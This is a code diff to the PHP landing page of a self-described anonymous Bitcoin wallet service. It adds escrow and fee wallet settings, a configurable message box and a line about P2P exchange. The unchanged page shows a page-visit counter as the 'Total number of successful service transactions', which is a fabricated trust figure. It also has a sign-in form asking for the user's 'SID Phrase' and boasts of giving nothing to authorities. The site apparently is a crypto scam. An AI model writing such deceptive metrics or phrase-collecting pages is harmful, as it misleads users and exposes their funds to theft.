@@ -41,6 +41,20 @@ $CONNECT->query("INSERT INTO visit_counter (page, count) VALUES ('total', 1)
 
 $visit_count = $CONNECT->insert_id;
 
+// Получаем текущие значения из таблицы
+$query = "SELECT * FROM `settings` WHERE `name` IN ('escrow_wallet_address', 'service_fee_address', 'message', 'message_display')";
+$result = mysqli_query($CONNECT, $query);
+$settings = [];
+while ($row = mysqli_fetch_assoc($result)) {
+    $settings[$row['name']] = $row['value'];
+}
+
+// Применяем htmlspecialchars только если значение существует
+$escrow_wallet_address = isset($settings['escrow_wallet_address']) ? htmlspecialchars($settings['escrow_wallet_address']) : '';
+$service_fee_address = isset($settings['service_fee_address']) ? htmlspecialchars($settings['service_fee_address']) : '';
+$message = isset($settings['message']) ? htmlspecialchars($settings['message']) : '';
+$message_display = isset($settings['message_display']) ? $settings['message_display'] : '0';
+
 
 ?>
 
@@ -63,7 +77,7 @@ $visit_count = $CONNECT->insert_id;
             color: green;
             padding: 15px;
             text-align: center;
-            font-size: 18px;
+            font-size: 12px;
             font-weight: bold;
             border-radius: 5px;
             width: 50%;
@@ -81,14 +95,17 @@ $visit_count = $CONNECT->insert_id;
 			<p>Own secure and fault-tolerant servers. No personal information is recorded, as well as transaction information. One-click registration is simple and does not require any personal information. All current transactions are temporarily displayed in your merchant profile. We do not provide any data to the authorities, as there is no stored data.</p>
             <p>In our anonymous Bitcoin wallet service, there are no minimum and maximum restrictions on deposits and withdrawals.</p>
 			<p>All transactions are performed automatically without human intervention. <br> And also - fast support!</p>
+			<p>There is also a section available for P2P exchange of BTC for fiat money.</p>
 			<p>Total number of successful service transactions: <?php echo $visit_count; ?></p>
-			 <div class="message-box1">
-				
-			</div>
+			<?php if ($message_display == '1' && !empty($message)): ?>
+            			<div class="message-box">
+               			 <p><?= $message ?></p>
+            			</div>
+				<?php endif; ?>
         </section>
 
       
-		<div class="form-container"> <!-- Контейнер для центрирования -->
+		<div class="form-container"> 
 		<form method="post" name="mainform" onsubmit="return checkform()" class="login-form">
 			<h2>Sign In</h2>
 			<input type="text" name="sid" placeholder="Your SID Phrase">
